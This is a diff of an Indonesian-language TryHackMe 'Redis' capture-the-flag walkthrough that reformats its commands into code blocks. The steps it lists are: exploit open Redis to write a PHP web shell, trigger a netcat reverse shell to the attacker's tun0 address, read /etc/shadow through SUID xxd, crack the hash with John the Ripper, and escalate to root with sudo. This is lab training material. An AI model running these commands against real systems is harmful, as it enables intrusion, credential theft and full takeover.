@@ -3,7 +3,10 @@
 - IP Machine: 10.10.191.28
 
 ## Port Scanning
-- Baris perintah: `nmap -sV -p- -T4 <IP Machine>`
+- Lakukan port scanning dengan tool `nmap`
+```sh
+nmap -sV -p- -T4 <IP Machine>
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%201.JPG)
 
@@ -12,11 +15,14 @@
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%202.JPG)
 
 ## Redis Exploit
-- Akses Redis dengan tool redis-cli dengan perintah `redis-cli -h <IP_Machine>`
+- Akses Redis pada server dengan tool `redis-cli`
+```sh
+redis-cli -h <IP_Machine>
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%203.JPG)
 
-- Buat Shell melalui Redis dengan perintah sebagai berikut
+- Setelah terhubung buat Shell melalui Redis dengan perintah sebagai berikut
 ```sh
 config set dir /var/www/html
 config set dbfilename shell.php
@@ -42,7 +48,10 @@ nc%20-e%20%2Fbin%2Fbash%20<IP tun0>%204444
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%206.JPG)
 
-- Buka terminal dan jalankan netcat dengan perintah `nc -lnvp <port>`
+- Buat listener netcat di terminal baru
+```sh
+nc -lnvp 4444
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%207.JPG)
 
@@ -73,7 +82,7 @@ find / -type f -user root -perm -4000 2>/dev/null
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2011.JPG)
 
-- Disini ditemukan SUID **/usr/bin/xxd**. Kita bisa memanfaatkan script di https://gtfobins.github.io/gtfobins/xxd/#file-read untuk melakukan eskalasi lebih lanjut. Gunakan script dibawah ini untuk membaca file **/etc/shadow** dan copy hash vianka
+- Disini ditemukan SUID **/usr/bin/xxd**. Kita bisa memanfaatkan script di https://gtfobins.github.io/gtfobins/xxd/#file-read untuk melakukan eskalasi lebih lanjut. Gunakan script dibawah ini untuk membaca file **/etc/shadow** dan copy hash user `vianka`
 ```sh
 LFILE=/etc/shadow
 /usr/bin/xxd "$LFILE" | /usr/bin/xxd -r
@@ -82,32 +91,54 @@ LFILE=/etc/shadow
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2012.JPG)
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2013.JPG)
 
-- Masukkan hash vianka ke dalam sebuah file dilocal dengan perintah `echo <hash> > <nama_file>`
+- Simpan hash tersebut ke dalam sebuah file di local dengan nama file **hash-vianka.txt**
+```sh
+echo 'paste_hash_here' > hash-vianka.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2014.JPG)
 
-- Crack hash vianka menggunakan tool john the ripper dengan perintah `john <wordlists> <hash_file>`
+- Crack hash user `vianka` diatas menggunakan tool `john the ripper` dan wordlist `rockyou.txt` yang terdapat di kali linux
+```sh
+john --wordlist=/usr/share/wordlists/rockyou.txt hash-vianka.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2015.JPG)
 
-- Switch ke user vianka dengan perintah `su vianka` kemudian masukkan password yang sudah ditemukan
+- Password berhasil ditemukan, sekarang switch ke user vianka lalu masukkan password diatas
+```sh
+su vianka
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2016.JPG)
 
 - Pada directory **/home** terdapat directory **vianka**. Pada directory **/home/vianka** terdapat file **user.txt** sebagai user flag. Buka file **user.txt**
+```sh
+cd /home/vianka
+cat user.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2017.JPG)
 
 ## Privilege Escalation
-- Gunakan perintah `sudo -l` untuk melihat perintah yang bisa dijalankan tanpa akses root
+- Lakukan pengecekan apakah user `vianka` punya akses ke sudo
+```sh
+sudo -l
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2018.JPG)
 
-- Dari hasil perintah diatas, kita bisa masuk ke user root hanya dengan perintah `sudo su`
+- Ternyata user `vianka` bisa mengakses, sehingga kita bisa langsung switch ke user `root`
+```sh
+sudo su
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2019.JPG)
 
-- Buka root flag yang berada di /root/root.txt dengan perintah `cat /root/root.txt`
+- Buka root flag yang berada di direktori **/root**
+```sh
+cat /root/root.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2020.JPG)
 
